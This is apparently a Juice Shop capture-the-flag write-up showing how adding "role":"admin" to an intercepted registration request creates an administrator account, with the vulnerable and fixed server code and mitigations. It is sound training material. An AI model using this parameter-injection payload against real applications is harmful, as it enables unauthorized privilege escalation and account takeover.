# Admin Registration Challenge

| Item | Detail |
|---|---|
| Category | Improper Input Validation |
| Difficulty | Hard (3-Star) |
| Juice Shop Flag | `score-board#Admin Registration` |
| Tools Used | Burp Suite (Proxy / Repeater) |
| Status | Solved |

---

## 1. Vulnerability Explanation

The registration endpoint:

```text
POST /api/Users
```

accepts JSON input containing email, password, and user details.

The backend does not properly validate or filter incoming fields before creating the account.

By adding an extra parameter:

```json
"role":"admin"
```

an attacker can register a new user account with administrator privileges instead of the default customer role.

This works because the server blindly trusts client-supplied JSON and assigns the role directly from the request body.

This challenge is rated **3 stars** because it requires:

- Understanding how the registration API works  
- Intercepting and modifying requests with Burp Suite  
- Knowing the correct parameter name and value  

---

## 2. Security Impact

- Privilege escalation from normal user to administrator  
- Complete bypass of role-based access control  
- Ability to manage users, orders, and administrative functions  
- Undermines the application's entire authorization model  

---

## 3. Step-by-Step Exploitation

### Step 1: Setup

- Configure browser to use Burp Suite proxy (`127.0.0.1:8080`)  
- Navigate to:

```text
/#/register
```

### Step 2: Intercept the registration request

- Turn **Intercept ON** in Burp Proxy tab  
- Fill in the registration form with example credentials:

```text
hacker@test.com / password123
```

- Click **Register**  
- Burp captures:

```http
POST /api/Users HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"email":"hacker@test.com","password":"password123","passwordRepeat":"password123"}
```

### Step 3: Modify the request in Repeater

Send the request to **Repeater** (`Ctrl + R`) and add the extra role parameter:

```json
{"email":"hacker@test.com","password":"password123","passwordRepeat":"password123","role":"admin"}
```

### Step 4: Send the request

- Click **Send**

Successful response:

```json
{"status":"success","data":{"id":42,"email":"hacker@test.com","role":"admin"}}
```

### Step 5: Verify admin privileges

- Log in with the newly created account:

```text
Email: hacker@test.com
Password: password123
```

- Navigate to:

```text
/#/administration
```

- The admin panel should now be accessible.

### Step 6: Final verification

- Check the **Score Board**  
- Challenge is marked as **Solved**

---

## 4. Why This Works

The registration endpoint directly maps JSON properties to database fields.

When the server receives:

```json
"role":"admin"
```

it stores that value without verifying whether the user is allowed to assign roles.

Default behavior should create users as:

```text
customer
```

but the attacker overrides that default.

### Vulnerable logic (example)

```javascript
User.create(req.body)
```

### Secure logic

```javascript
User.create({
  email: req.body.email,
  password: hashedPassword,
  role: "customer"
})
```

---

## 5. Mitigation

- Never trust client-supplied role or privilege fields  
- Hardcode default roles on the server  
- Allow role changes only through authenticated admin endpoints  
- Use a whitelist of accepted fields during account creation  

---

## 6. Key Takeaways

- 3-star challenges often require multi-step API manipulation  
- Always inspect registration requests for hidden injectable parameters  
- `role":"admin"` is a classic privilege escalation vector  
- Burp Repeater is excellent for testing parameter injection  
- Never let the client define its own permissions  